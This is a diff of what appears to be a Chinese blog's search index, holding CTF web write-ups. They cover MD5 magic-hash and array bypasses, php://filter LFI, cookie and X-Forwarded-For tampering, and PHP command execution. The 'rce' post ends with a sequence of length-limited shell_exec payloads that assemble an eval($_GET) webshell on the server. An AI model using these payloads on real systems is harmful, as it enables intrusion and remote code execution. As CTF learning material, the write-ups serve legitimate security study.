-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>md5</tag>
-        <tag>sql</tag>
-        <tag>代码审计</tag>
-        <tag>bypass</tag>
       </tags>
   </entry>
   <entry>
@@ -2616,6 +2474,148 @@ error_reporting(<span class="hljs-number">0</span>);
         <tag>弱类型</tag>
         <tag>变量覆盖</tag>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nctf</title>
+    <url>/2020/08/29/nctf/</url>
+    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><span id="more"></span>
+
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
+<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
+<p><strong>md5函数漏洞</strong></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
+<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
+<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
+&#125;&#125;
+<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre>
+
+<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>常见的payload有</p>
+<pre><code class="hljs c++">QNKCDZO
+<span class="hljs-number">240610708</span>
+s878926199a
+s155964671a
+s214587387a
+s214587387a
+ sha1(str)
+sha1(&#x27;aaroZmOk&#x27;)  
+sha1(&#x27;aaK1STfY&#x27;)
+sha1(&#x27;aaO8zKZF&#x27;)
+sha1(&#x27;aa3OFF9m&#x27;)</code></pre>
+
+<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
+<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
+<p>再次输入口令即可。</p>
+<p>考点为前端代码修改</p>
+<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
+<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
+<p>在最后发现flag</p>
+<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
+<p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" alt></p>
+<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
+<p>点击发现url改变，跳转到了另一个页面</p>
+<p>bp抓包试试，go一下，相应包中出现flag</p>
+<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
+<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
+<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
+<p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" alt></p>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
+<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
+<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
+<p>base64解码</p>
+<pre><code class="hljs php+HTML">&lt;html&gt;
+    &lt;title&gt;asdf&lt;&#x2F;title&gt;
+&lt;?php
+	error_reporting(0);
+	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
+	$file&#x3D;$_GET[&#39;file&#39;];
+	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+		echo &quot;Oh no!&quot;;
+		exit();
+	&#125;
+	include($file); 
+&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
+?&gt;
+&lt;&#x2F;html&gt;</code></pre>
+
+<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
+<p> <strong>TIP: 0==not</strong> </p>
+<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code>   go</p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
+<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据">元数据</a>（Metadata，又称元数据）。</strong></p>
+<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
+<p>查看robots.txt</p>
+<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
+<pre><code class="hljs php">TIP:sql.php
+<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre>
+
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id]) &#123;
+   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  <span class="hljs-variable">$id</span> = intval(<span class="hljs-variable">$_GET</span>[id]);
+  <span class="hljs-variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="hljs-string">&quot;select content from ctf2 where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>));
+  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[id]==<span class="hljs-number">1024</span>) &#123;
+      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;
+  &#125;
+  <span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$query</span>[content]);
+  &#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
+<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
+<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
+<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
+<p>想到了intval()函数的作用，尝试id=1024.1</p>
+<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
+<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>])) &#123;
+       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;
+       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)   
+           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
+       <span class="hljs-keyword">else</span>
+           <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;
+   &#125;</code></pre>
+
+<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
+<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
+<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
+&#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])
+<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))
+<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
+<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;
+&#125; 
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
+<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
+<p>payload:</p>
+<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
+<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
+<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>md5</tag>
+        <tag>sql</tag>
+        <tag>代码审计</tag>
+        <tag>bypass</tag>
       </tags>
   </entry>
   <entry>
@@ -2941,6 +2941,114 @@ var_dump(<span class="hljs-keyword">$this</span>);
       </categories>
   </entry>
   <entry>
+    <title>rce</title>
+    <url>/2020/11/29/rce/</url>
+    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
+<span id="more"></span>
+
+<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
+<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
+<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
+
+
+
+<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
+<p>例如</p>
+<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
+
+<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
+
+
+
+<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
+<p>用法如下</p>
+<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
+$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
+$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
+$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
+call_user_func($a,$b)<span class="hljs-comment">;</span>
+call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
+
+<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
+<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
+<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
+<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
+<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$b</span>();
+
+<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
+    phpinfo();
+&#125;
+</code></pre>
+
+
+
+<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
+<p>实验目的</p>
+<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
+    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>限制了参数1的字符长度为15</p>
+<p>然后将传递的参数放到shell_exec中执行</p>
+<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
+<p>所以想要够的payload的为</p>
+<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
+
+<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
+<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
+<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
+<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
+<p>例如下面</p>
+<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
+<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
+<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
+<p>下面就可以做这个题目了</p>
+<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
+?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
+?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
+
+<p>之后访问1.php提交参数，获取想要的内容。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>cmd</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python安全攻防</title>
     <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
@@ -3168,114 +3276,6 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
       <categories>
         <category>python</category>
       </categories>
-  </entry>
-  <entry>
-    <title>rce</title>
-    <url>/2020/11/29/rce/</url>
-    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
-<span id="more"></span>
-
-<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
-<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
-<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
-
-
-
-<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
-<p>例如</p>
-<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
-
-<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
-
-
-
-<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
-<p>用法如下</p>
-<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
-$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
-$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
-$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
-call_user_func($a,$b)<span class="hljs-comment">;</span>
-call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
-
-<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
-<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
-<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
-<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
-<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
-<span class="hljs-variable">$b</span>();
-
-<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
-    phpinfo();
-&#125;
-</code></pre>
-
-
-
-<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
-<p>实验目的</p>
-<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
-    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>限制了参数1的字符长度为15</p>
-<p>然后将传递的参数放到shell_exec中执行</p>
-<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
-<p>所以想要够的payload的为</p>
-<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
-
-<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
-<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
-<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
-<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
-<p>例如下面</p>
-<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
-<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
-<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
-<p>下面就可以做这个题目了</p>
-<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
